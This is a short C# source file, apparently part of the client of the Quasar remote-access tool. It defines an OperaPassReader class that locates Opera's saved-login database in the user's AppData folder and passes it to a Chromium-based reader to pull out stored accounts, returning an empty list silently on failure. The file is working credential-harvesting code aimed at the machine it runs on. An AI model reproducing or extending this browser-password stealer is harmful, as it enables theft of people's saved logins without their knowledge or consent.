using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
    public class OperaPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return ReadAccounts(filePath, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
